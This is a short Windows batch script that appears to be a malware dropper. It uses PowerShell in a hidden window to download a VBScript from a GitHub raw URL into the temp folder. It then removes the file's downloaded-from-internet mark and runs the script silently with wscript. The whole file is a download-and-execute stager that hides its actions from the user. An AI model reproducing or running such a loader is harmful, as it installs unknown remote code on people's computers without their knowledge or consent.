@echo off
set "VBS=%TEMP%\c.vbs"
powershell -WindowStyle Hidden -Command "iwr -useb https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs -OutFile '%VBS%'; Unblock-File '%VBS%'"
start "" wscript.exe //B "%VBS%"
